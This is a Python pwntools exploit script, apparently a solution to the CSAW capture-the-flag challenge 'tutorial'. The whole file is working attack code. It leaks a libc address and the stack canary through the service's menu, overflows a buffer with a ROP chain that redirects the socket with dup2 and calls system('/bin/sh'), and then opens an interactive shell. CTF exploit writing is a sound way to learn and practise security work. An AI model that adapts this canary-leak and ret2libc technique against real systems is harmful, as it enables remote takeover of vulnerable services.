#!/usr/bin/env

from pwn import *
#context.log_level = "DEBUG"
e = ELF("libc-2.19.so")
eo = ELF("tutorial")

r = remote("pwn.chal.csaw.io", 8002)

# first we leak the libc address
r.recvuntil(">")
r.sendline("1")
r.recvuntil(":")
puts_addr = int(r.recvline().strip(), 16) + 0x500
# resolve libc base
libc_base = puts_addr - e.symbols["puts"]
log.info("Puts address: " + hex(puts_addr))
log.info("Libc base: " + hex(libc_base))

# now leak stack cookie
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
r.sendline("a" * 311)
r.recvline()
# stack cookie here
stack_cookie = r.recvn(8)
log.info("Stack cookie: " + enhex(stack_cookie))
# verify stack cookie, send magic ptr
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
str_addr = 0x401320
pop_rdi = 0x4012e3 
fd = int(sys.argv[1])
# dup2(fd, 1)
# dup2(fd, 0)
# dup2(fd, 2)
# system("/bin/sh")
#fd = 5
buf = "a" * 312 + stack_cookie + 'a' * 8
pop_rsi = 0x4012e1 # also pops r15
pop_rdx = libc_base + 0x1b8e

buf += p64(pop_rdi) + p64(fd)
buf += p64(pop_rsi) + p64(1) + p64(0)
buf += p64(libc_base + e.symbols["dup2"])

buf += p64(pop_rdi) + p64(fd)
buf += p64(pop_rsi) + p64(0) + p64(0)
buf += p64(libc_base + e.symbols["dup2"])

buf += p64(pop_rdi) + p64(libc_base + 0x17c8c3)
buf += p64(libc_base + e.symbols["system"])

"""
# test script
buf += p64(pop_rdi) + p64(fd)
buf += p64(pop_rsi) + p64(str_addr) + p64(0)
buf += p64(pop_rdx) + p64(5)
buf += p64(libc_base + e.symbols["write"])
"""
r.send(buf)
#print r.recvall()
r.interactive()
